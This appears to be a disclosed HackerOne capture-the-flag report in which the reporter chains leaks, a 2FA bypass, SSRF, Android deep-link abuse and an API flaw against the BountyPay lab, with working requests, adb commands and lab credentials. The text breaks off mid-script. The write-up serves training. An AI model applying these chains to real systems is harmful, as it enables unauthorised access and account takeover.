{"id":887993,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODc5OTM=","url":"https://hackerone.com/reports/887993","title":"[H1-2006 2020] CTF","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-05-31T17:25:49.624Z","submitted_at":"2020-05-31T17:25:49.624Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jeti","url":"/jeti","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/yx1viTW9oDGqB1gL1dz6GzEi/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-18T15:29:49.530Z","bug_reporter_agreed_on_going_public_at":"2020-06-18T05:52:48.508Z","team_member_agreed_on_going_public_at":"2020-06-18T15:29:49.415Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"As there is a bonus for first 10 solutions for now I'll just post a flag.\n\nF850100\n\n## Impact\n\n-","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":850100,"file_name":"flag.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VTtPyhHCPQD7CY7WZm5p9XBc?response-content-disposition=attachment%3B%20filename%3D%22flag.jpg%22%3B%20filename%2A%3DUTF-8%27%27flag.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153818Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=df89a519b8875d858267bf8f3f5dc2f791fefa6d061830de619ce2197937e355","file_size":30459,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2020-07-18T05:52:48.572Z","allow_singular_disclosure_after":-38915130.27696688,"singular_disclosure_allowed":true,"vote_count":3,"voters":["nytr0gen","brahim_boufakri01","shamollash"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8236755,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-08T21:06:46.794Z","updated_at":"2020-06-08T21:06:46.794Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8236858,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-06-08T21:17:55.385Z","updated_at":"2020-06-08T21:17:55.385Z","additional_data":{"old_title":"H1-2006 2020 CTF","new_title":"[H1-2006 2020] CTF"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8256264,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# 0x1 Information Disclosure\n\nGit metadata directory (.git) was found under [https://app.bountypay.h1ctf.com/.git](https://app.bountypay.h1ctf.com/.git) directory. An attacker can extract sensitive information by requesting the hidden metadata directory that version control tool Git creates.\n\n## Proof of Concept\n\nGit repository can be found by enumerating directories with tools like *dirsearch, dirbuster, ffuf:*\n\n```bash\n$ dirsearch https://app.bountypay.h1ctf.com/\n\n _|. _ _  _  _  _ _|_    v0.3.9\n(_||| _) (/_(_|| (_| )\n\nExtensions: -t | HTTP method: get | Threads: 10 | Wordlist size: 6110\n\nTarget: https://app.bountypay.h1ctf.com/\n\n[09:01:54] Starting:\n[09:01:55] 400 -  182B  - /%2e%2e/google.com\n[09:01:56] 403 -  170B  - /.git\n[09:01:56] 403 -  170B  - /.git/\n[09:01:56] 200 -  278B  - /.git/config\n[09:01:56] 200 -   73B  - /.git/description\n[09:01:56] 200 -   23B  - /.git/HEAD\n[09:01:56] 200 -    0B  - /.git/index\n[09:01:56] 200 -  114B  - /.git/packed-refs\n```\n\nDownload and examine *config* file. You can see that the file leaks public GitHub repository URL:\n\n```bash\n$ wget https://app.bountypay.h1ctf.com/.git/config\n\n$ cat config\n\n[core]\n        repositoryformatversion = 0\n        filemode = true\n        bare = false\n        logallrefupdates = true\n[remote \"origin\"]\n        url = **https://github.com/bounty-pay-code/request-logger.git**\n        fetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n        remote = origin\n        merge = refs/heads/master\n```\n\n\n# 0x2 Sensitive information disclosure\n\nLog file containing sensitive information was found publicly accessible under https://app.bountypay.h1ctf.com/bp_web_trace.log address.\n\n### Details\n\nCode review of PHP script `logger.php` found in public repository https://github.com/bounty-pay-code/request-logger.git revealed filename of log file (potentially accessible from internet):\n\n```php\n\u003c?php\n\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\n\n### Proof of Concept\n\nDownload log file:\n\n```bash\n$ wget https://app.bountypay.h1ctf.com/bp_web_trace.log\n\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n\n```\nDecode file (base64 encoding):\n\n```bash\n$ cat bp_web_trace.log | cut -d: -f2 |base64 -d\n\n[...]\n\n{\n   \"IP\":\"192.168.1.1\",\n   \"URI\":\"\\/\",\n   \"METHOD\":\"POST\",\n   \"PARAMS\":{\n      \"GET\":[\n\n      ],\n      \"POST\":{\n         \"username\":\"brian.oliver\",\n         \"password\":\"V7h0inzX\"\n      }\n   }\n}\n[...]\n```\n\nUser and password is visible in clear text.\n\n# 0x3 Two-Factor Authentication Bypass\n\nTwo factor authentication implemented at https://app.bountypay.h1ctf.com can be bypassed if user name / password is known.\n\n### Details\n\nAfter providing valid username and password at Login page of https://app.bountypay.h1ctf.com user is asked to provide 10 character token that was sent to his mobile phone.\n\nOne of the hidden parameters that are passed via HTML form is `challenge`. \n\n```html\n\u003cform method=\"post\" action=\"/\"\u003e\n                \u003cinput type=\"hidden\" name=\"username\" value=\"brian.oliver\"\u003e\n                \u003cinput type=\"hidden\" name=\"password\" value=\"V7h0inzX\"\u003e\n                \u003cinput type=\"hidden\" name=\"challenge\" value=\"d1442073259978fe231a00f297e00626\"\u003e\n\t\t\t\t\t\t\t\t\u003cinput name=\"challenge_answer\" class=\"form-control\"\u003e\n```\n\nWhen user submit token password following request is made:\n\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nContent-Length: 103\nOrigin: https://app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=f561aaf6ef0bf14d4208bb46a4ccb3ad\u0026challenge_answer=xxx\n```\n\nThe problem is that `challenge` parameter that is used to check if provided `challenge_answer` is correct is completely under user's control. That means if algorithm used to compare both values is known attacked can provide both values and effectively bypass 2FA.\n\nIn this case algorithm is very basic:\n\n`challenge` = MD5(`challenge_answer`)\n\n### Proof of Concept\n\nWe can intercept request when `challenge_answer` value is sent to server and modify both `challenge` and `challenge_answer` values:\n\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nContent-Length: 103\nOrigin: https://app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=f561aaf6ef0bf14d4208bb46a4ccb3ad\u0026challenge_answer=xxx\n```\n\nWhere MD5('xxx') = 'f561aaf6ef0bf14d4208bb46a4ccb3ad'\n\n# 0x4 Chaining multiple vulnerabilities into SSRF\n\nBy chaining multiple vulnerabilities it is possible to read internal assets via server side request forgery (SSRF).\n\n## 0x4.1 Path traversal\n\nhttps://app.bountypay.h1ctf.com/statements endpoint makes internal HTTP request to https://api.bountypay.h1ctf.com/api/accounts/account_id/statements API endpoint and provides response in JSON format:\n\n```http\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\n[...]\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=01\u0026year=2020\",\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-01\\\",\\\"transactions\\\":[]}\"}\n```\n\nPart of the URL of internal API call can be controlled by attacker via `token` session cookie.\n\n `token` cookie is a base64 encoded JSON object containing following data:\n\n```json\ntoken = {\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\n\nModifying `account_id` value does not invalidate the session. Also this value is reflected in the URL where internal API call is made in `/statements`  endpoint:\n\n```http\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\n[...]\nCookie: token=Base64Encode({\"account_id\":\"**user_supplied_data**\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"})\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/**user_supplied_data**\\/statements?month=01\u0026year=2020\",\"data\":\"[\\\"Endpoint Not Found\\\"]\"}\n```\n\nImproper validation of this user controllable cookie results in path traversal and effectively allows calling any endpoint on https://api.bountypay.h1ctf.com/ host (attacker can suffix injected value with hash sign # to turn the rest of the URL into a url fragment and force server to skip it) :\n\n```http\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\n[...]\nCookie: token=Base64Encode({\"account_id\":\"\"../../#\"\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"})\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/..\\/..\\/#\\/statements?month=01\u0026year=2020\",\"data\":\"\u003c!DOCTYPE html\u003e\\n\u003chtml lang=\\\"en\\\"\u003e\\n\u003chead\u003e\\n[...]\u003e\"}\n```\n\nThis bug when exploited alone doesn't have big impact but it can be chained with another issue that was found on `https://api.bountypay.h1ctf.com` site to increase impact.\n\n## 0x4.2 Open redirect\n\nhttps://api.bountypay.h1ctf.com/redirect\u0026url= endpoint is vulnerable to open redirect. Quick research revealed that `url=` parameter accepts following URL patterns:\n\n- https://www.google.com/search?q=*\n- https://api.bountypay.h1ctf.com/*\n- https://software.bountypay.h1ctf.com/*\n\n```http\nGET /redirect?url=https://software.bountypay.h1ctf.com/test HTTP/1.1\nHost: api.bountypay.h1ctf.com\nConnection: close\n\nHTTP/1.1 302 Found\nServer: nginx/1.14.0 (Ubuntu)\nDate: Mon, 08 Jun 2020 20:03:23 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nLocation: https://software.bountypay.h1ctf.com/test\nContent-Length: 0\n```\n\n## 0x4.3 SSRF\n\nBy chaining together two vulnerabilities presented above attacker can read internal assets that are normally restricted to internal IP addresses only.\n\nFirst vulnerability allow us to traverse path on https://api.bountypay.h1ctf.com/* and call `/redirect` endpoint which will redirect internal API call to internal site.\n\nWhen we call https://software.bountypay.h1ctf.com directly we receive 401 Unauthorized status:\n\n```http\nGET / HTTP/1.1\nHost: software.bountypay.h1ctf.com\n[...]\n\nHTTP/1.1 401 Unauthorized\nServer: nginx/1.14.0 (Ubuntu)\nDate: Mon, 08 Jun 2020 20:06:54 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nContent-Length: 208\n\n\u003chtml\u003e\n\u003chead\u003e\u003ctitle\u003e401 Unauthorized\u003c/title\u003e\u003c/head\u003e\n\u003cbody\u003e\n\u003ccenter\u003e\u003ch1\u003e401 Unauthorized\u003c/h1\u003e\u003c/center\u003e\n\u003chr\u003e\u003ccenter\u003eYou do not have permission to access this server from your IP Address\u003c/center\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nBut when we call it using chained vulnerabilities we can retrieve contents of protected resource:\n\n```http\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\n[...]\nCookie: token=Base64Encode({\"account_id\":\"../../redirect?url=https:%2f%2fsoftware.bountypay.h1ctf.com/#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2})\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/..\\/..\\/redirect?url=https:%2f%2fsoftware.bountypay.h1ctf.com\\/#\\/statements?month=01\u0026year=2020\",\"data\":\"\u003c!DOCTYPE html\u003e[...]\u003ctitle\u003eSoftware Storage\u003c\\/title\u003e\\n [...]\"}\n```\n\n## 0x4.3 Directory indexing enabled\n\nFurther investigation revealed that directory https://software.bountypay.h1ctf.com/uploads/ has indexing enabled and it contains file BountyPay.apk that is directly accessible without IP restrictions:\n\n```http\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\n[...]\nCookie: token=Base64Encode({\"account_id\":\"../../redirect?url=https:%2f%2fsoftware.bountypay.h1ctf.com/uploads/#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"})\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/..\\/..\\/redirect?url=https:%2f%2fsoftware.bountypay.h1ctf.com\\/uploads\\/#\\/statements?month=01\u0026year=2020\",\"data\":\"\u003chtml\u003e\\n\u003chead\u003e\u003ctitle\u003e**Index of \\/uploads**\\/\u003c\\/title\u003e\u003c\\/head\u003e\\n\u003cbody bgcolor=\\\"white\\\"\u003e\\n\u003ch1\u003eIndex of \\/uploads\\/\u003c\\/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\\\"..\\/\\\"\u003e..\\/\u003c\\/a\u003e\\n\u003ca href=\\\"\\/uploads\\/BountyPay.apk\\\"\u003eBountyPay.apk\u003c\\/a\u003e                                        20-Apr-2020 11:26              4043701\\n\u003c\\/pre\u003e\u003chr\u003e\u003c\\/body\u003e\\n\u003c\\/html\u003e\\n\"}\n```\n\n# 0x5 Multiple insecure deep link vulnerabilities\nBountyPay Android app is vulnerable to multiple insecure deep link vulnerabilities.\n\nAndroidManifest.xml contains following activities with deep link definitions:\n\n```xml\n\u003cactivity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_three\" android:name=\"bounty.pay.PartThreeActivity\"\u003e\n            \u003cintent-filter android:label=\"\"\u003e\n[...]             \n                \u003cdata android:scheme=\"three\" android:host=\"part\"/\u003e\n            \u003c/intent-filter\u003e\n        \u003c/activity\u003e\n        \u003cactivity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_two\" android:name=\"bounty.pay.PartTwoActivity\"\u003e\n            \u003cintent-filter android:label=\"\"\u003e\n[...]\n                \u003cdata android:scheme=\"two\" android:host=\"part\"/\u003e\n            \u003c/intent-filter\u003e\n        \u003c/activity\u003e\n        \u003cactivity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_one\" android:name=\"bounty.pay.PartOneActivity\"\u003e\n            \u003cintent-filter android:label=\"\"\u003e\n[...]\n                \u003cdata android:scheme=\"one\" android:host=\"part\"/\u003e\n            \u003c/intent-filter\u003e\n        \u003c/activity\u003e\n```\n\n## 0x5.1 Insecure deep link in PartOneActivity\n\nBy examining decompiled source code of PartOneActivity we can observe that deep link defined for this activity requires additional query parameter `start=ParttwoActivity`\n\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n            String firstParam = getIntent().getData().getQueryParameter(\"start\");\n            if (firstParam != null \u0026\u0026 firstParam.equals(\"PartTwoActivity\") \u0026\u0026 settings.contains(str)) {\n[...]\n                startActivity(new Intent(this, PartTwoActivity.class));\n            }\n        }\n```\n\nSo by following a deep link `one://part?start=PartTwoActivity` attacker is able to execute normally invisible activity called PartTwoActivity:\n\n```bash\n$ adb shell am start -W -a android.intent.action.VIEW -d 'one://part?start=PartTwoActivity'\nStarting: Intent { act=android.intent.action.VIEW dat=one://part?start=PartTwoActivity }\nStatus: ok\n```\n\nResult:\n\n{F862635}\n\n\n## 0x5.2 Insecure deep link in PartTwoActivity\n\nFollowing code validates deep link query parameters for *PartTwoActivity*:\n\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n            Uri data = getIntent().getData();\n            String firstParam = data.getQueryParameter(\"two\");\n            String secondParam = data.getQueryParameter(\"switch\");\n            if (firstParam != null \u0026\u0026 firstParam.equals(\"light\") \u0026\u0026 secondParam != null \u0026\u0026 secondParam.equals(\"on\")) {\n                editText.setVisibility(0);\n                button.setVisibility(0);\n                textview.setVisibility(0);\n            }\n        }\n```\n\ns we can see deep link requires two parameters: `two=light` and `switch=on`.\n\nBy following a deep link `two://part?two=light\u0026switch=on` attacker is able to execute code that reveals some hidden controls:\n\n```bash\n$ adb shell am start -W -a android.intent.action.VIEW -d 'two://part?two=light\\\u0026switch=on'\nStarting: Intent { act=android.intent.action.VIEW dat=two://part?two=light\u0026switch=on }\nStatus: ok\n```\n\nresult:\n{F862634}\nUnhidden form waits for header name to be provided. After examining source code we can see that header name must consist of `X-`prefix and value retrieved from Firebase database from `header` directory .\n\n```java\nString str = \"header\";\n        this.directory = str;\n        this.database = FirebaseDatabase.getInstance().getReference();\n        this.childRef = this.database.child(str);\n\n[...]\nString value = (String) dataSnapshot.getValue();\n[...]\n                sb.append(\"X-\");\n                sb.append(value);\n```\n\n## 0x5.3 Unprotected firebase database\n\nFirebase database URL can be retrieved from resources/strings.xml:\n\n```xml\n\u003cstring name=\"firebase_database_url\"\u003ehttps://bountypay-90f64.firebaseio.com\u003c/string\u003e\n```\n\nSo value that we are looking for can be simpl by visiting https://bountypay-90f64.firebaseio.com/header.json:\n\n```json\n{'token'}\n```\n\nAfter providing concatenated values: `X-token` into input form, previously hidden activity *PartThreeActivity* will be executed.\n\n## 0x5.4 Insecure deep link in PartThreeActivity\n\nCode that validates deep link query parameters for *PartThreeActivity*:\n\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n            Uri data = getIntent().getData();\n            String firstParam = data.getQueryParameter(\"three\");\n            String secondParam = data.getQueryParameter(\"switch\");\n            String thirdParam = data.getQueryParameter(\"header\");\n            byte[] decodeFirstParam = Base64.decode(firstParam, 0);\n            byte[] decodeSecondParam = Base64.decode(secondParam, 0);\n            final String decodedFirstParam = new String(decodeFirstParam, StandardCharsets.UTF_8);\n            final String decodedSecondParam = new String(decodeSecondParam, StandardCharsets.UTF_8);\n            AnonymousClass5 r17 = r0;\n            DatabaseReference databaseReference = this.childRefThree;\n            byte[] bArr = decodeSecondParam;\n            final String str = firstParam;\n            byte[] bArr2 = decodeFirstParam;\n            final String str2 = secondParam;\n            String str3 = secondParam;\n            final String secondParam2 = thirdParam;\n            String str4 = firstParam;\n            final EditText editText2 = editText;\n            Uri uri = data;\n            final Button button2 = button;\n            AnonymousClass5 r0 = new ValueEventListener() {\n                public void onDataChange(DataSnapshot dataSnapshot) {\n                    String value = (String) dataSnapshot.getValue();\n                    if (str != null \u0026\u0026 decodedFirstParam.equals(\"PartThreeActivity\") \u0026\u0026 str2 != null \u0026\u0026 decodedSecondParam.equals(\"on\")) {\n                        String str = secondParam2;\n                        if (str != null) {\n                            StringBuilder sb = new StringBuilder();\n                            sb.append(\"X-\");\n                            sb.append(value);\n                            if (str.equals(sb.toString())) {\n                                editText2.setVisibility(0);\n                                button2.setVisibility(0);\n                                PartThreeActivity.this.thread.start();\n                            }\n                        }\n                    }\n                }\n```\n\nFollowing parameters are required for a deep link to work:\n\n- `three` = base64('PartThreeActivity') = `UGFydFRocmVlQWN0aXZpdHk=`\n- `switch` = base64('on') = `b24=`\n- `header` = 'X-Token'\n\n## 0x5.5 Information disclosure in console log\n\nExecuting deep link: `adb shell am start -W -a android.intent.action.VIEW -d 'three://part?three=UGFydFRocmVlQWN0aXZpdHk%3d\\\u0026switch=b24%3d\\\u0026header=X-Token'`\n\nresults in sensitive data leakage in console log:\n\n```plaintext\n05-30 16:00:55.074  5509  6640 D HOST IS: : http://api.bountypay.h1ctf.com\n05-30 16:00:55.074  5509  6640 D TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1\n05-30 16:00:55.075  5509  6640 D HEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\n\nAlso CongratsActivity is executed:\n{F862636}\n\n# 0x6 Exposed dangerous method in API\n\nhttps://api.bountypay.h1ctf.com/staff  REST API endpoint includes a dangerous function that can be used to create new staff members.\n\n## Details\n\nIf attacker is in the possession of authentication token (e.g. leaked from Android app), he can retrieve data from `/staff`  REST API endpoint using `GET` HTTP method:\n\n```http\nGET /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n\nHTTP/1.1 200 OK\n\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n```\n\nThe same endpoint (with `POST` request) can be used to create staff member account if only staff member ID is known. This is dangerous behavior because staff ID for Bounty Pay company can be retrieved from publicly available sources. Also this number is visible on employee badges.\n\n```http\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 42\n\nstaff_id=STF:84DJKEIP38\n\nHTTP/1.1 409 Conflict\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sat, 30 May 2020 21:47:54 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 39\n\n[\"Staff Member already has an account\"]\n```\n\n## Proof of Concept\n\nAn example of publicly available staff member ID can be found on Twitter account of new Bounty Pay HQ employee: \n{F862639}\nUsing observed staff ID we can create staff member account:\n\n```http\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nConnection: close\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 23\n\nstaff_id=**STF:8FJ3KFISL3**\n\nHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 31 May 2020 08:39:57 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 110\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\n# 0x7 Privilege escalation\n\nWith use of *Report This Page* functionality found on https://staff.bountypay.h1ctf.com/ it is possible to escalate privileges of currently logged in user. This require chaining multiple vulnerabilities. Each vulnerability will be described separately and chaining will be presented at the end.\n\n### 0x7.1 Stored code injection\n\nIt is possible to inject HTML code into https://staff.bountypay.h1ctf.com/ by intercepting and modifying request for changing profile avatar:\n\n```http\nPOST /?template=home HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nConnection: close\nContent-Length: 42\nOrigin: https://staff.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nCookie: token=xxx\n\nprofile_name=sandra\u0026profile_avatar=avatar2%20injected%20code\n```\n\nInjected code will be reflected in Profile tab and in `/?template=ticket\u0026ticket_id=3582` example ticket:\n\n```html\n\u003cdiv class=\"panel-body\"\u003e\n                    \u003cdiv style=\"width: 100px;position: absolute\"\u003e\n                        \u003cdiv style=\"margin:auto\" class=\"avatar avatar1 injected code\"\u003e\u003c/div\u003e\n                        \u003cdiv class=\"text-center\"\u003esandra\u003c/div\u003e\n                    \u003c/div\u003e\n                    \u003cdiv\u003e\n```\n\nReflected code is properly escaped so no HTML tags, quotes and special characters are allowed however this is enough to inject any class name into DOM context.\n\nThis vulnerability combined with Javascript code available in `/js/website.js` lets attacker inject class names that will receive `click` events.\n\nFollowing code turns any element with `tab` class into clickable element: \n\n```javascript\n$(\".tab\").click(function() {\n    return $(\".tab\").removeClass(\"active\"),\n    $(this).addClass(\"active\"),\n    $(\"div.content\").addClass(\"hidden\"),\n    $(\"div.content-\" + $(this).attr(\"data-target\")).removeClass(\"hidden\"),\n    !1\n}),\n```\n\nFollowing code turns any element with `upgradeToAdmin` class into clickable element: \n\n```javascript\n$(\".upgradeToAdmin\").click(function() {\n    let t = 